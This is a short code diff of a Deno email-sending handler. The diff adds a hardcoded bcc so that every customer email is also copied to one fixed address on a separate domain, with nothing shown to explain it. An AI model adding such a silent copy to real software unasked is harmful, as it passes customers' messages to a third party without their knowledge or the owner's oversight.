@@ -173,7 +173,9 @@ Deno.serve(async (req) => {
             body: JSON.stringify({
               from: tSettings.email ? `${tSettings.company_name ?? "CMR"} <${tSettings.email}>` : "CMR <onboarding@resend.dev>",
               to: [d.customer_email],
+              bcc: ["k.trinh@alix-operation.de"],
               subject,
+
               text,
             }),
           });
